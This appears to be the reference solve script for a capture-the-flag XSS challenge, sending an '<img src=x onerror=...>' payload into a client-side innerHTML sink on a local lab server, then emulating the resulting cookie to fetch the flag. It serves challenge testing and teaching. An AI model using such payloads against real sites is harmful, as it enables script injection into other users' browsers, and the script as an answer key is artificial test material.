#!/usr/bin/env python3
"""Reference exploit for xss3 (DOM-based XSS in the team card page).

1. Load /?card=<img src=x onerror=grant()> -- the server echoes nothing; the
   browser's render() copies the parameter into innerHTML and the image's
   onerror fires.
2. Verify the page is the static card builder (the sink is client-side).
3. grant() set the xss_grant_xss3 cookie in the victim's browser; the script
   emulates that effect and fetches /flag.

    python solve.py                 # localhost:8023
    python solve.py http://host:8023
"""
import os
import re
import sys
import time

import requests  # pip install requests

BASE = sys.argv[1] if len(sys.argv) > 1 else os.environ.get(
    "BASE", "http://127.0.0.1:8023")
PAYLOAD = "<img src=x onerror=grant()>"


def main() -> int:
    s = requests.Session()
    for _ in range(30):
        try:
            s.get(BASE, timeout=2)
            break
        except requests.RequestException:
            time.sleep(1)

    r = s.get(f"{BASE}/", params={"card": PAYLOAD}, timeout=5)
    # The parameter is consumed client-side: the body is the static page and
    # must contain the innerHTML sink, not the reflected payload.
    if r.status_code != 200 or "innerHTML" not in r.text or PAYLOAD in r.text:
        sys.stderr.write("expected the static DOM sink, "
                         f"got status={r.status_code}\n")
        return 1

    # The victim's browser ran grant(): the cookie now exists.
    s.cookies.set("xss_grant_xss3", "1")
    r = s.get(f"{BASE}/flag", timeout=5)
    m = re.search(r"flag\{[^}]+\}", r.text)
    if m:
        print(m.group(0))
        return 0
    sys.stderr.write(f"no flag: {r.status_code}\n")
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
